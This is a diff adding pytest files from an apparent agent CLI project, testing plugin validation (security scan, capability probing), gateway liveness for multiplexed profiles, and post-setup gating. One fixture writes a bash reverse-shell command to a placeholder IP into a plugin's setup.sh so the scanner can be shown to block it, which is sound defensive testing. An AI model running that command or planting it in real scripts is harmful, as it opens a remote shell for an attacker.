@@ -1,0 +1,338 @@
+
+
+=== ARCHIVO: .\hermes-agent\tests\hermes_cli\test_plugin_validate.py ===
+"""Tests for ``hermes plugins validate`` (hermes_cli/plugin_validate.py).
+
+Static manifest checks + subprocess-isolated capability probing against a
+recording stub context.
+"""
+
+from __future__ import annotations
+
+from pathlib import Path
+
+import yaml
+
+from hermes_cli.plugin_validate import validate_plugin_dir
+
+
+def _make_plugin(
+    tmp_path: Path,
+    *,
+    manifest: dict,
+    init_py: str = "def register(ctx):\n    pass\n",
+) -> Path:
+    d = tmp_path / manifest.get("name", "fixture-plugin")
+    d.mkdir(parents=True, exist_ok=True)
+    (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8")
+    (d / "__init__.py").write_text(init_py, encoding="utf-8")
+    return d
+
+
+BASE_MANIFEST = {
+    "name": "fixture-plugin",
+    "version": "1.0.0",
+    "description": "A fixture plugin.",
+}
+
+
+def test_requires_hermes_spec_is_validated(tmp_path):
+    manifest = dict(BASE_MANIFEST, requires_hermes=">=0.21")
+    d = _make_plugin(tmp_path, manifest=manifest)
+
+    report = validate_plugin_dir(d)
+
+    assert report.ok, report.failures
+    assert ("requires_hermes", True, "spec '>=0.21' parses") in report.checks
+
+
+def test_admission_runs_the_install_scanner(tmp_path):
+    """Admission and install must agree: a tree the installer would hard-block (dangerous) fails
+    validation; caution findings are surfaced to the reviewer as warnings without failing."""
+    caution = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="caution-plugin"))
+    (caution / "helper.py").write_text("eval('1 + 1')\n", encoding="utf-8")
+    report = validate_plugin_dir(caution)
+    assert report.ok, report.failures
+    assert ("security scan", True, "caution") in report.checks
+    assert any(w.startswith("security scan caution:") for w in report.warnings)
+
+    dangerous = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="dangerous-plugin"))
+    (dangerous / "setup.sh").write_text("/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
+    report = validate_plugin_dir(dangerous)
+    assert not report.ok
+    assert any(name == "security scan" and not ok for name, ok, _ in report.checks)
+
+
+class TestCapabilityProbe:
+    def test_undeclared_tool_registration_fails_with_diff(self, tmp_path):
+        init = (
+            "def register(ctx):\n"
+            "    ctx.register_tool('sneaky_tool', 'sneaky', {}, lambda a: '')\n"
+        )
+        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
+        report = validate_plugin_dir(d)
+        assert not report.ok
+        joined = " ".join(report.failures)
+        assert "sneaky_tool" in joined
+        assert "undeclared" in joined.lower()
+
+    def test_declared_and_registered_passes(self, tmp_path):
+        manifest = dict(BASE_MANIFEST, provides_tools=["good_tool"])
+        init = (
+            "def register(ctx):\n"
+            "    ctx.register_tool('good_tool', 'good', {}, lambda a: '')\n"
+        )
+        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
+        report = validate_plugin_dir(d)
+        assert report.ok
+
+    def test_declared_but_not_registered_warns(self, tmp_path):
+        manifest = dict(BASE_MANIFEST, provides_tools=["phantom_tool"])
+        d = _make_plugin(tmp_path, manifest=manifest)
+        report = validate_plugin_dir(d)
+        assert report.ok  # warn, not fail
+        assert any("phantom_tool" in w for w in report.warnings)
+
+    def test_undeclared_hook_registration_fails(self, tmp_path):
+        init = (
+            "def register(ctx):\n"
+            "    ctx.register_hook('pre_tool_call', lambda **kw: None)\n"
+        )
+        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
+        report = validate_plugin_dir(d)
+        assert not report.ok
+        assert any("pre_tool_call" in f for f in report.failures)
+
+    def test_crashing_register_is_contained(self, tmp_path):
+        init = "def register(ctx):\n    raise RuntimeError('boom')\n"
+        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
+        report = validate_plugin_dir(d)  # must not raise / kill the CLI
+        assert not report.ok
+        assert any("boom" in f or "register()" in f for f in report.failures)
+
+    def test_import_time_os_exit_is_contained(self, tmp_path):
+        init = "import os\nos._exit(7)\n"
+        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
+        report = validate_plugin_dir(d)
+        assert not report.ok
+
+    def test_builtin_tool_collision_fails(self, tmp_path):
+        manifest = dict(BASE_MANIFEST, provides_tools=["terminal"])
+        init = (
+            "def register(ctx):\n"
+            "    ctx.register_tool('terminal', 'shadow', {}, lambda a: '')\n"
+        )
+        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
+        report = validate_plugin_dir(d)
+        assert not report.ok
+        joined = " ".join(report.failures)
+        assert "terminal" in joined
+        assert "built-in" in joined
+
+    def test_probe_context_returns_get_config_defaults(self, tmp_path):
+        """Real PluginContext.get_config yields the default when nothing is configured; the probe must
+        too, or every plugin doing ``int(ctx.get_config("timeout", 180))`` fails admission."""
+        d = _make_plugin(
+            tmp_path,
+            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
+            init_py=(
+                "def register(ctx):\n"
+                "    int(ctx.get_config('timeout_seconds', 180))\n"
+                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
+        )
+        report = validate_plugin_dir(d)
+        assert report.ok, report.failures
+
+
+    def test_probe_context_has_real_context_attribute_surface(self, tmp_path):
+        """An attribute the real PluginContext lacks must raise AttributeError in the probe too:
+        handing back a callable made ``getattr(ctx, "profile_path", None)`` truthy and crashed
+        register() only under validation."""
+        d = _make_plugin(
+            tmp_path,
+            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
+            init_py=(
+                "def register(ctx):\n"
+                "    assert getattr(ctx, 'profile_path', None) is None\n"
+                "    ctx.register_platform('probe', object)\n"
+                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
+        )
+        report = validate_plugin_dir(d)
+        assert report.ok, report.failures
+
+
+class TestModelProviderKind:
+    def test_import_time_register_provider_is_the_entry_point(self, tmp_path):
+        """``kind: model-provider`` plugins register at import via providers.register_provider and
+        are never handed a register(ctx); validate must accept that contract, not demand register()."""
+        d = _make_plugin(
+            tmp_path,
+            manifest={**BASE_MANIFEST, "name": "probe-provider", "kind": "model-provider"},
+            init_py=(
+                "from providers import register_provider\n"
+                "from providers.base import ProviderProfile\n"
+                "register_provider(ProviderProfile(name='probe_provider_fixture'))\n"),
+        )
+        report = validate_plugin_dir(d)
+        assert report.ok, report.failures
+        assert any(
+            name == "capability probe" and "probe_provider_fixture" in detail
+            for name, _ok, detail in report.checks
+        ), report.checks
+
+    def test_provider_plugin_that_registers_nothing_fails(self, tmp_path):
+        d = _make_plugin(
+            tmp_path,
+            manifest={**BASE_MANIFEST, "name": "empty-provider", "kind": "model-provider"},
+            init_py="import providers\n",
+        )
+        report = validate_plugin_dir(d)
+        assert not report.ok
+        assert any("registered no ProviderProfile" in f for f in report.failures), report.failures
+
+
+class TestRequiresHermesSpec:
+    """A typo'd ``requires_hermes`` clause must fail admission, not silently gate nothing."""
+
+    def test_typoed_clause_fails_admission(self, tmp_path):
+        d = _make_plugin(
+            tmp_path, manifest={**BASE_MANIFEST, "requires_hermes": ">=0.21.1,<0.x"}
+        )
+        report = validate_plugin_dir(d)
+        assert not report.ok
+        assert any(
+            "requires_hermes" in f and "does not parse" in f for f in report.failures
+        ), report.failures
+
+
+
+
+=== ARCHIVO: .\hermes-agent\tests\hermes_cli\test_pooled_served_profile_backend_unscoped.py ===
+"""A pooled Desktop backend (``hermes --profile X serve``, HERMES_HOME=<root>/profiles/X) answers its
+REST without ``?profile=``. Those UNSCOPED reads/verbs are about X — a profile the live default
+multiplexer serves — and must agree with the scoped ``?profile=X`` answer and with ``hermes -p X status``:
+running-via-multiplexer, start/stop refused, restart addressed to the multiplexer's home.
+
+Live repro (Desktop over a multiplexed HOME): Command Center said "Messaging gateway stopped" for X,
+the Messaging page pinned every platform "gateway stopped", and Restart spawned a bare ``gateway
+restart`` under X's HERMES_HOME that exited 78 while the UI reported success.
+"""
+
+from __future__ import annotations
+
+import json
+import os
+
+import pytest
+
+
+@pytest.fixture
+def pooled_served_process(tmp_path, monkeypatch):
+    """Process whose HERMES_HOME is a served named profile; the default home records a live multiplexer."""
+    root = tmp_path / "hermes"
+    for name in ("alpha", "solo"):
+        (root / "profiles" / name).mkdir(parents=True)
+        (root / "profiles" / name / "config.yaml").write_text("{}\n")  # identity marker
+    (root / "config.yaml").write_text("gateway: {multiplex_profiles: true}\n")
+    (root / "gateway.pid").write_text(json.dumps({"pid": os.getpid(), "hermes_home": str(root)}))
+    (root / "gateway_state.json").write_text(json.dumps({
+        "pid": os.getpid(), "hermes_home": str(root), "gateway_state": "running",
+        "served_profiles": ["default", "alpha"],
+        "platforms": {"api_server": {"state": "connected"}, "alpha:telegram": {"state": "connected"}}}))
+    monkeypatch.setenv("HERMES_HOME", str(root / "profiles" / "alpha"))
+    monkeypatch.delenv("GATEWAY_MULTIPLEX_PROFILES", raising=False)
+    import hermes_constants
+    import gateway.status as status
+    # Liveness is a verified identity; this pytest process passes as the default gateway only by
+    # wearing a gateway command line.
+    monkeypatch.setattr(status, "_read_process_cmdline", lambda pid: "hermes gateway run")
+    monkeypatch.setattr(hermes_constants, "_default_hermes_root_memo", None)
+    from hermes_cli import profiles as profiles_mod
+    monkeypatch.setattr(profiles_mod, "_check_gateway_running", lambda home: False)
+    return root
+
+
+def test_unscoped_liveness_in_a_served_profile_process_matches_the_scoped_answer(pooled_served_process):
+    from gateway.status import profile_platforms_from_multiplexer, resolve_gateway_liveness
+    alpha = pooled_served_process / "profiles" / "alpha"
+    scoped = resolve_gateway_liveness(profile_dir=alpha, health_probe=None, use_cache=False)
+    unscoped = resolve_gateway_liveness(health_probe=None, use_cache=False)
+    assert (unscoped.running, unscoped.pid, unscoped.source) == (scoped.running, scoped.pid, "multiplexer")
+    plats = profile_platforms_from_multiplexer(unscoped.runtime, "alpha")
+    assert plats["telegram"] == {"state": "connected"} and plats["api_server"]["state"] == "connected"
+
+
+def test_unscoped_lifecycle_verbs_in_a_served_profile_process_address_the_multiplexer(pooled_served_process):
+    from hermes_cli.web_server_gateway import _gateway_subcommand, _profile_action_environment, multiplexed_profile_refusal
+    assert multiplexed_profile_refusal(None, "stop") and multiplexed_profile_refusal(None, "start")
+    restart = _gateway_subcommand(None, "restart")
+    assert restart[-2:] == ["gateway", "restart"]
+    # The child must run under the DEFAULT home (the multiplexer's), not inherit alpha's HERMES_HOME.
+    assert _profile_action_environment(restart)["HERMES_HOME"] == str(pooled_served_process)
+    # A profile with no multiplexer relationship is still managed as its own gateway.
+    assert _gateway_subcommand("solo", "restart") == ["-p", "solo", "gateway", "restart"]
+    assert multiplexed_profile_refusal("solo", "stop") is None
+
+
+
+=== ARCHIVO: .\hermes-agent\tests\hermes_cli\test_post_setup_gating.py ===
+"""Tests for the post_setup install-state gate in `_toolset_needs_configuration_prompt`.
+
+Regression coverage for the cua-driver silent-no-op bug (issue #22737).
+
+When a no-key provider's only install side-effect is a `post_setup` hook
+(cua-driver, etc.), the gate function used to fall through to the
+`_toolset_has_keys` catch-all, which returned True for any provider with
+empty `env_vars` — causing `hermes tools` to write the toolset to config
+and exit `✓ Saved` without ever invoking the post_setup install. These
+tests pin the new predicate-aware behaviour so the regression doesn't
+sneak back in.
+"""
+
+from __future__ import annotations
+
+
+class TestPostSetupGate:
+    def test_cua_driver_missing_forces_setup(self, monkeypatch, tmp_path):
+        """When cua-driver isn't on PATH, the gate must return True so the
+        provider-setup flow runs and triggers `_run_post_setup`."""
+        from hermes_cli import tools_config
+
+        monkeypatch.setenv("HERMES_HOME", str(tmp_path))
+        monkeypatch.setattr("shutil.which", lambda name, path=None: None)
+
+        assert tools_config._toolset_needs_configuration_prompt(
+            "computer_use", {}
+        ) is True
+
+    def test_incompatible_cua_driver_forces_setup(self, monkeypatch):
+        from hermes_cli import tools_config, tools_config_post_setup
+
+        monkeypatch.setattr(tools_config_post_setup, "_cua_driver_install_ready", lambda: False)
+
+        assert tools_config._toolset_needs_configuration_prompt(
+            "computer_use", {}
+        ) is True
+
+    def test_compatible_cua_driver_skips_setup(self, monkeypatch):
+        from hermes_cli import tools_config, tools_config_post_setup
+
+        monkeypatch.setattr(tools_config_post_setup, "_cua_driver_install_ready", lambda: True)
+
+        assert tools_config._toolset_needs_configuration_prompt(
+            "computer_use", {}
+        ) is False
+
+
+    def test_post_setup_predicate_exception_does_not_block(self, monkeypatch):
+        """A predicate that raises must be treated as 'satisfied' so a
+        broken check can't strand the user in an infinite setup loop."""
+        from hermes_cli import tools_config
+
+        def _boom():
+            raise RuntimeError("predicate broken")
+
+        monkeypatch.setitem(tools_config._POST_SETUP_INSTALLED, "cua_driver", _boom)
+        assert tools_config._post_setup_already_installed("cua_driver") is True
+
+
